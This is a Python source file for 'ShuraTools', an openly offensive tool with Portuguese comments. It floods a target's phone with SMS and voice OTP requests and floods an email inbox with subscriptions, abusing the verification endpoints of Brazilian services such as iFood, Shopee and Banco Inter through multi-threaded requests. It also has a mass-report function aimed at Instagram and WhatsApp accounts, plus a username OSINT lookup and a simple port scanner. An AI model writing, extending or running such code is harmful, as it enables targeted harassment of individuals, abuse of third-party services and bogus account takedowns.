#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v8.0 TBOMB-INSPIRED EDITION
Baseado na arquitetura do TBomb com APIs brasileiras funcionais
"""

import os, sys, time, random, threading, socket, json
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] Execute: pip install requests colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}    [ SMS/Call Bomber | Email | OSINT ]
{Fore.WHITE}  v8.0 TBomb-Inspired Edition - by Shura
"""

LOCK = threading.Lock()
SUCCESS_COUNT = 0
FAIL_COUNT = 0

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, t="info"):
    c = {"info": Fore.WHITE+"[*] ", "success": Fore.GREEN+"[+] ", "error": Fore.RED+"[-] ", "warn": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{msg}{Style.RESET_ALL}")

def safe_int(prompt, default):
    try: return int(input(prompt) or default)
    except: return default

# ========== API DATABASE (Estilo TBomb) ==========
SMS_APIS = [
    {
        "name": "iFood",
        "url": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number",
        "method": "POST",
        "data": {"phoneNumber": "{target}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Magalu",
        "url": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp",
        "method": "POST",
        "data": {"phone": "{target}"},
        "headers": {}
    },
    {
        "name": "Shopee",
        "url": "https://shopee.com.br/api/v2/authentication/send_code",
        "method": "POST",
        "data": {"phone": "{target}", "type": 1},
        "headers": {}
    },
    {
        "name": "Mercado Livre",
        "url": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm",
        "method": "POST",
        "data": {"phone": "{target}"},
        "headers": {}
    },
    {
        "name": "TikTok",
        "url": "https://www.tiktok.com/passport/web/send_code/",
        "method": "POST",
        "data": {"mobile": "{target}", "account_sdk_source": "web"},
        "headers": {}
    }
]

CALL_APIS = [
    {
        "name": "QuintoAndar",
        "url": "https://api.quintoandar.com.br/api/v1/auth/send-otp",
        "method": "POST",
        "data": {"phone": "{target}", "method": "VOICE"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Banco Inter",
        "url": "https://api.inter.co/v1/auth/request-otp",
        "method": "POST",
        "data": {"phone": "{target}", "type": "VOICE"},
        "headers": {}
    },
    {
        "name": "iFood Call",
        "url": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify",
        "method": "POST",
        "data": {"phone": "{target}", "method": "call"},
        "headers": {}
    }
]

EMAIL_APIS = [
    {
        "name": "Tecnoblog",
        "url": "https://tecnoblog.net/wp-admin/admin-ajax.php",
        "method": "POST",
        "data": {"action": "tnp", "na": "s", "ne": "{target}", "ny": "on"},
        "headers": {}
    },
    {
        "name": "The News",
        "url": "https://thenewscc.beehiiv.com/subscribe",
        "method": "POST",
        "data": {"email": "{target}"},
        "headers": {}
    },
    {
        "name": "Invest News",
        "url": "https://investnews.beehiiv.com/subscribe",
        "method": "POST",
        "data": {"email": "{target}"},
        "headers": {}
    }
]

# ========== BOMBER ENGINE (Multi-threaded como TBomb) ==========
def bomber_engine(target, apis, qty, threads, delay):
    global SUCCESS_COUNT, FAIL_COUNT
    SUCCESS_COUNT = 0
    FAIL_COUNT = 0
    
    log(f"Iniciando ataque com {len(apis)} APIs e {threads} threads", "warn")
    
    def attack_single(api, index):
        global SUCCESS_COUNT, FAIL_COUNT
        try:
            # Substitui {target} no payload
            data = json.loads(json.dumps(api["data"]).replace("{target}", target))
            
            # Faz a requisição
            session = requests.Session()
            res = session.post(
                api["url"],
                json=data if api["headers"].get("Content-Type") == "application/json" else None,
                data=data if not api["headers"].get("Content-Type") else None,
                headers=api["headers"],
                timeout=10
            )
            
            if res.status_code < 400:
                with LOCK:
                    SUCCESS_COUNT += 1
                log(f"[{index+1}/{qty}] {api['name']} → OK", "success")
            else:
                with LOCK:
                    FAIL_COUNT += 1
                log(f"[{index+1}/{qty}] {api['name']} → Block ({res.status_code})", "warn")
            
            time.sleep(delay)
        except Exception as e:
            with LOCK:
                FAIL_COUNT += 1
            log(f"[{index+1}/{qty}] {api['name']} → Timeout", "error")
    
    # Executa ataques em paralelo
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for i in range(qty):
            api = random.choice(apis)
            executor.submit(attack_single, api, i)
    
    log(f"Ataque concluído! Sucesso: {SUCCESS_COUNT} | Falhas: {FAIL_COUNT}", "info")

# ========== OSINT ==========
def osint(target):
    log(f"OSINT Hunter: {target}", "warn")
    user = target.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{user}/",
        "GitHub": f"https://github.com/{user}",
        "TikTok": f"https://www.tiktok.com/@{user}",
        "Twitter": f"https://twitter.com/{user}",
        "LinkedIn": f"https://www.linkedin.com/in/{user}",
        "Facebook": f"https://www.facebook.com/{user}",
        "Reddit": f"https://www.reddit.com/user/{user}",
        "YouTube": f"https://www.youtube.com/@{user}",
        "Twitch": f"https://www.twitch.tv/{user}",
        "Medium": f"https://medium.com/@{user}"
    }
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            log(f"{name}: {'FOUND' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
        except:
            log(f"{name}: Timeout", "error")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning {target}...", "warn")
    try:
        ip = socket.gethostbyname(target)
        log(f"IP: {ip}", "info")
        for port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                log(f"Port {port} OPEN", "success")
            s.close()
    except Exception as e:
        log(f"Error: {e}", "error")

# ========== MENU ==========
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print("-" * 60)
            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(SMS_APIS)} APIs)")
            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(CALL_APIS)} APIs)")
            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(EMAIL_APIS)} APIs)")
            print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
            print("-" * 60)
            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
            print(f"{Fore.WHITE}[ 6 ] Port Scanner")
            print(f"{Fore.WHITE}[ 0 ] EXIT")
            print("-" * 60)
            
            opt = input(f"{Fore.YELLOW}Shura@Arsenal:~$ {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt == "1":
                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
                qty = safe_int("Quantidade (20): ", 20)
                threads = safe_int("Threads (5): ", 5)
                delay = safe_int("Delay em segundos (2): ", 2)
                bomber_engine(target, SMS_APIS, qty, threads, delay)
            
            elif opt == "2":
                print(f"{Fore.CYAN}[INFO] Formato: 5511999999999 (DDI+DDD+Número){Style.RESET_ALL}")
                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                if not target.isdigit(): log("Inválido!", "error"); time.sleep(1); continue
                qty = safe_int("Quantidade (10): ", 10)
                threads = safe_int("Threads (3): ", 3)
                delay = safe_int("Delay em segundos (3): ", 3)
                bomber_engine(target, CALL_APIS, qty, threads, delay)
            
            elif opt == "3":
                print(f"{Fore.CYAN}[INFO] Digite o e-mail do alvo{Style.RESET_ALL}")
                target = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                if "@" not in target: log("Inválido!", "error"); time.sleep(1); continue
                qty = safe_int("Quantidade (15): ", 15)
                threads = safe_int("Threads (5): ", 5)
                delay = safe_int("Delay em segundos (1): ", 1)
                bomber_engine(target, EMAIL_APIS, qty, threads, delay)
            
            elif opt == "4":
                target = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
                type = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                url = "https://i.instagram.com/api/v1/users/web_report/" if type == "ig" else "https://v.whatsapp.net/v2/report"
                for i in range(safe_int("Qty (50): ", 50)):
                    try:
                        requests.post(url, data={"username":target}, timeout=5)
                        log(f"Report {i+1} sent", "success")
                    except: pass
            
            elif opt == "5":
                target = input(f"{Fore.YELLOW}Target (@user sem @): {Style.RESET_ALL}").strip()
                osint(target)
            
            elif opt == "6":
                target = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
                port_scan(target)
            
            input(f"\n{Fore.GREEN}Concluído. ENTER...{Style.RESET_ALL}")
            
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
